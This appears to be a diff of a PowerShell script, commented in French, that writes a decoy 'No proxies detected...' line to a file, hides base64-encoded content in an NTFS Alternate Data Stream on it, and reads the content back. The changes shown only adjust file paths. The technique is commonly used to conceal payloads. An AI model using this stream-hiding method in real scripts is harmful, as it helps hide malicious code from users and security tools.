@@ -22,7 +22,7 @@ catch {
 }
 
 try {
-    "No proxies detected..." | Out-File $HostFile -Encoding UTF8
+    "No proxies detected..." | Out-File ./$HostFile -Encoding UTF8
 }
 catch {
     exit 1
@@ -30,10 +30,10 @@ catch {
 
 # Étape 3: Stocker le contenu dans un ADS
 try {
-    Set-Content -Path "$HostFile`:$ADSName" -Value $Base64Content
+    Set-Content -Path "./$HostFile`:$ADSName" -Value $Base64Content
     
     # Vérifier
-    $StreamInfo = Get-Item $HostFile -Stream $ADSName -ErrorAction SilentlyContinue
+    $StreamInfo = Get-Item ./$HostFile -Stream $ADSName -ErrorAction SilentlyContinue
     if ($StreamInfo) {
     } else {
         throw "ADS non détecté après création"
@@ -47,7 +47,7 @@ catch {
 try {
     
     # Méthode 1: Get-Content (recommandé)
-    $EncodedFromADS = Get-Content "$HostFile`:$ADSName" -Raw
+    $EncodedFromADS = Get-Content "./$HostFile`:$ADSName" -Raw
     
     # Nettoyer les éventuels sauts de ligne
     $EncodedFromADS = $EncodedFromADS -replace "`n|`r|\s", ""
@@ -57,7 +57,7 @@ try {
 }
 catch {
     try {
-        $Stream = [System.IO.File]::OpenRead("$HostFile`:$ADSName")
+        $Stream = [System.IO.File]::OpenRead("./$HostFile`:$ADSName")
         $Reader = New-Object System.IO.StreamReader($Stream)
         $EncodedFromADS = $Reader.ReadToEnd()
         $Reader.Close()
